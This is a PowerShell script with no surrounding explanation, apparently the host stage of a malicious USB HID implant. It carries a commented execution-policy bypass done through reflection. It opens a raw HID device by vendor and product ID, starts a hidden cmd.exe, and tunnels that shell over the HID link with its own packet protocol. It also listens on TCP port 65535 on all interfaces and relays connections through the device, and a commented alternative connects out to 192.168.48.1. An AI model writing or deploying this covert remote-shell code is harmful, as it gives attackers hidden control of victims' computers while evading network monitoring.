# function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy

if ($M -eq $null) {
	$M = 64
	$cs = '
	using System;
	using System.IO;
	using Microsoft.Win32.SafeHandles;
	using System.Runtime.InteropServices;
	namespace n {
		public class w {
			[DllImport(%kernel32.dll%, CharSet = CharSet.Auto, SetLastError = true)]
			public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
			[DllImport(%user32.dll%)]
			public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
			[DllImport(%user32.dll%)]
			public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

			public static FileStream o(string fn) {
				return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
			}
		}
	}
	'.Replace('%',[char]34)
	Add-Type -TypeDefinition $cs
	try {
		$devs = gwmi Win32_USBControllerDevice
		foreach ($dev in $devs) {
			$wmidev = [wmi]$dev.Dependent
			if ($wmidev.GetPropertyValue('DeviceID') -match ('1209&PID_6667') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
				$fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
			}
		}
		$f = [n.w]::o($fn)
		# $f = (New-Object Net.Sockets.TcpClient("192.168.48.1", 65535)).GetStream()
	} catch {
		echo $_.Exception|format-list -force
		$ErrorMessage = $_.Exception.Message
		$FailedItem = $_.Exception.ItemName
		[System.Console]::WriteLine("Exception caught, terminating main loop")
		[System.Console]::WriteLine($ErrorMessage)
		[System.Console]::WriteLine($FailedItem)
	}
}

$Proxy = {
	Param($M, $Device)

	$SYN=1
	$ACK=2
	$FIN=4
	$RST=8

	function spawn($filename, $arguments) {
		$p = New-Object -TypeName System.Diagnostics.Process
		$i = $p.StartInfo
		$i.CreateNoWindow = $true
		$i.UseShellExecute = $false
		$i.RedirectStandardInput = $true
		$i.RedirectStandardOutput = $true
		$i.RedirectStandardError = $true
		$i.FileName = $filename
		$i.Arguments = $arguments
		$null = $p.Start()
		return $p
	}

	function bs($v, $n) { [math]::floor($v * [math]::pow(2, $n)) }
	function sa($s,$a) { (bs ($s -band 15) 4) -bor ($a -band 15)}
	function seq($b) { (bs $b -4) -band 15 }
	function ack($b) { $b -band 15 }

	function MakeHIDPacket($tcb, $flag, $data, $length) {
		if ($length -eq $null) {
			$length = 0
		} elseif ($length -lt 0 -or $length -gt ($M-4)) {
			$length = 0
			[System.Console]::WriteLine("Length out of range: " + $length)
			exit
		}
		if ((($flag -band $SYN) -eq $SYN) -or (($flag -band $FIN) -eq $FIN) -or $length -gt 0) {
			$tcb.SendSeq++
		}
		$b = @(0, $tcb.Channel, $flag, (sa $tcb.SendSeq $tcb.Ack))
		$b += $length
#		[System.Console]::WriteLine("Sending: " + $b)

		for ($i=0; $i -lt $length; $i++) {
			$b += $data[$i]
		}
		for ($i=$length; $i -lt ($M-4); $i++) {
			$b += 0
		}
		if ($b.Length -ne ($M+1)) {
			[System.Console]::WriteLine("Invalid length: " + $b.Length)
		}
		return $b
	}

	function MakeTCB($channel, $ReadStream, $WriteStream) {
		return @{
			Channel = $channel
			ReadStream = $ReadStream
			WriteStream = $WriteStream
			StreamReadBuff = New-Object Byte[] ($M-4)
			SendSeq = 3
			SendUnack = 3
			Ack = 0
			RecNxt = 0
		}
	}

	function debugPacket($prefix, $tcb, $packet) {
		if ($tcb -eq $null) {
			$u = ""
		} else {
			$u = $tcb.SendUnack
		}
		[System.Console]::WriteLine([string]::Format($prefix + "Channel: {0} Flags={1} Seq={2} Ack={3} Length={4} (SendUnack={5})", $packet[1], $packet[2], (seq $packet[3]), (ack $packet[3]), $packet[4], $u))
	}

	function WriteDevice($tcb, $packet) {
		debugPacket "S: " $tcb $packet
		$device.Write($packet, 0, ($M+1))
	}

	function ReadSocket($tcb) {
		if ($tcb.StreamReadTask -ne $null -and $tcb.StreamReadTask.IsCompleted) {
			$l = $tcb.ReadStream.EndRead($tcb.StreamReadTask)
			[System.Console]::WriteLine("ReadSocket got " + $l)

			if ($l -gt 0) {
				WriteDevice $tcb (MakeHIDPacket $tcb $ACK $tcb.StreamReadBuff $l)
				$tcb.StreamReadTask = $tcb.ReadStream.BeginRead($tcb.StreamReadBuff, 0, ($M-4), $null, $null)
			} else {
				WriteDevice $tcb (MakeHIDPacket $tcb $FIN $null 0)
				$tcb.StreamReadTask = $null
			}
		}
	}

	function ProcessAck($tcb, $packet) {
		$a = ($tcb.SendUnack+1) -band 15
#		[System.Console]::WriteLine("ProcessAck: TCB SendUnack=" + $tcb.SendUnack + " SendSeq=" + $tcb.SendSeq)
#		[System.Console]::WriteLine("ProcessAck: channel " + $tcb.Channel + " " + $a + ":" + (ack $packet[3]))
		if (ack $packet[3] -eq (($tcb.SendUnack+1) -band 15)) {
			$tcb.SendUnack = ack $packet[3]
		}
	}

	function OpenChannel($channel, $ReadStream, $WriteStream) {
		$tcb = MakeTCB $channel $ReadStream $WriteStream
		[System.Console]::WriteLine("Using TCB channel " + $tcb.Channel)
		$packet = MakeHIDPacket $tcb $SYN $null 0
		WriteDevice $tcb $packet
		return $tcb
	}

	function CleanupTCB($tcb) {
		[System.Console]::WriteLine("Cleanup TCB")

		if ($tcb.ReadStream -ne $null) {
			try {
				$tcb.ReadStream.Close()
				$tcb.ReadStream.Dispose()
				$tcb.StreamReadTask = $null
				$tcb.ReadStream = $null

				$tcb.WriteStream.Close()
				$tcb.WriteStream.Dispose()
				$tcb.WriteStream = $null
			} catch {
				echo $_.Exception|format-list -force
			}
		}
	}

	try {
		[System.Console]::WriteLine("Entering proxy thread")
		$conns=New-Object HashTable[] 256

		# Spawn a command prompt on channel 1
		$cmd = spawn "cmd.exe" "/c cmd.exe /k 2>&1 "
		$conns[1] = OpenChannel 1 $cmd.StandardOutput.BaseStream $cmd.StandardInput.BaseStream

		$TcpListener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any, 65535)
		$TcpListener.Start()
		$ListenerTask = $TcpListener.BeginAcceptTcpClient($null, $null)

		$DeviceBuff = New-Object Byte[] ($M+1)
		$DeviceReadTask = $Device.BeginRead($DeviceBuff, 0, ($M+1), $null, $null)

		[System.Console]::WriteLine("Entering proxy loop")
		while ($true) {
			if ($DeviceReadTask -ne $null -and $DeviceReadTask.IsCompleted) {
				$l = $Device.EndRead($DeviceReadTask)
				$DeviceReadTask = $Device.BeginRead($DeviceBuff, 0, ($M+1), $null, $null)
				debugPacket "R: " $tcb $DeviceBuff
				if ($l -ne ($M+1)) {
					[System.Console]::WriteLine("Error reading from device, got " + $l + " bytes")
					$TcpListener.Stop()
					exit
				}

				$channel = $DeviceBuff[1+0]
				$tcb = $conns[$channel]
				$flag = $DeviceBuff[1+1]
				if ($flag -eq $SYN) {
					# incoming from the other side of the HID, not supported yet
					$tcb = MakeTCB $channel $null $null
					$Device.Write((MakeHIDPacket $tcb $RST $null 0), 0, ($M+1))
					CleanupTCB $tcb
				} elseif ($tcb -ne $null -band ($flag -eq $FIN -or $flag -eq $RST )) {
					[System.Console]::WriteLine("Flag: " + $flag)
					$Device.Write((MakeHIDPacket $tcb ($flag -bor $ACK) $null 0), 0, ($M+1))
					CleanupTCB $tcb
				} elseif (($flag -band $ACK) -eq $ACK) {
					if ($tcb -ne $null) {
						ProcessAck $tcb $DeviceBuff
						$response = $false
						$l = 0
						$data = $null
						if (($flag -band $SYN) -eq $SYN) { # If we get a SYN/ACK, we can start reading from the socket
							$tcb.Ack = ((seq $DeviceBuff[1+2]) + 1) -band 15
							$tcb.StreamReadTask = $tcb.ReadStream.BeginRead($tcb.StreamReadBuff, 0, ($M-4), $null, $null)
							$response = $true
							$flag = $ACK
						} elseif (($flag -band $FIN) -eq $FIN) {
							$conns[$channel] = $null
							CleanupTCB $tcb
						} else {
							if ($tcb.StreamReadTask -ne $null -and $tcb.StreamReadTask.IsCompleted) {
								$l = $tcb.ReadStream.EndRead($tcb.StreamReadTask)
								if ($l -gt 0) {
									$data = $tcb.StreamReadBuff + 0
									$tcb.StreamReadTask = $tcb.ReadStream.BeginRead($tcb.StreamReadBuff, 0, ($M-4), $null, $null)
									$flag = $ACK
								} else {
									$tcb.StreamReadTask = $null
									$flag = $FIN
								}
								$response = $true
							}
							if ((seq $DeviceBuff[1+2]) -eq $tcb.Ack -and $DeviceBuff[1+3] -gt 0) {
								$tcb.Ack = ($tcb.Ack+1) -band 15
								try {
									$tcb.WriteStream.Write($DeviceBuff, 1+4, $DeviceBuff[1+3])
									$tcb.WriteStream.Flush()
								} catch {
									$Device.Write((MakeHIDPacket $tcb $RST $null 0), 0, ($M+1))
									CleanupTCB $tcb
									continue
								}
								$response = $true
							}
						}
						if ($response -eq $true) {
							WriteDevice $tcb (MakeHIDPacket $tcb $flag $data $l)
						}
					} else {
						[System.Console]::WriteLine("Bad ACK on channel with no TCB: " + $channel)
					}
				}
				continue
			}

			if ($ListenerTask -ne $null -and $ListenerTask.IsCompleted) {
				[System.Console]::WriteLine("Connection received")
				$channel = $null
				for ($c=2; $c -lt 255; $c++) {
					if ($conns[$c] -eq $null) {
						$channel = $c
						break
					}
				}
				[System.Console]::WriteLine("Connect will use channel: " + $channel)
				$client = $TcpListener.EndAcceptTcpClient($ListenerTask)
				if ($channel -eq $null) {
					[System.Console]::WriteLine("No channels available")
					$client.Close()
				} else {
					$tcb = OpenChannel $channel $client.GetStream() $client.GetStream()
					$conns[$channel] = $tcb
				}
				$ListenerTask = $TcpListener.BeginAcceptTcpClient($null, $null)
				continue
			}
			for ($c=1;$c -lt 256;$c++) {
				if ($conns[$c] -ne $null) {
					ReadSocket $conns[$c]
				}
			}
			if ($loop++ -eq 1000) {
				$loop=0
				Start-Sleep -m 1
			}
#			[System.Console]::Write(".")
		}
	} catch {
		echo $_.Exception|format-list -force
		$ErrorMessage = $_.Exception.Message
		$FailedItem = $_.Exception.ItemName
		[System.Console]::WriteLine("Exception caught, terminating main loop")
		[System.Console]::WriteLine($ErrorMessage)
		[System.Console]::WriteLine($FailedItem)
	}

	[System.Console]::Write("Proxy thread completed")
	$cmd.Kill()
	$device.Close()
	$socket.Close()
	exit
}

& $Proxy $M $f
